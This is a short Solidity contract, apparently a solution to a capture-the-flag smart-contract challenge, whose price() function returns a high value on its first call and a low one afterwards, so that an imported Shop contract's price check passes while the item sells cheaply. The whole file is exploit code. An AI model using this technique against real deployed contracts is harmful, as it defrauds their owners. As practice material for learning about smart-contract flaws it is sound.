// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Shop} from "./Shop.sol";

contract Buyer {
    Shop src;

    bool called = false;

    constructor(address _src) {
        src = Shop(_src);
    }

    function price() public returns (uint) {
        if (!called) {
            called = true;
            return 110;
        } else {
            return 90;
        }
    }

    function attack() public {
        src.buy();
    }
}
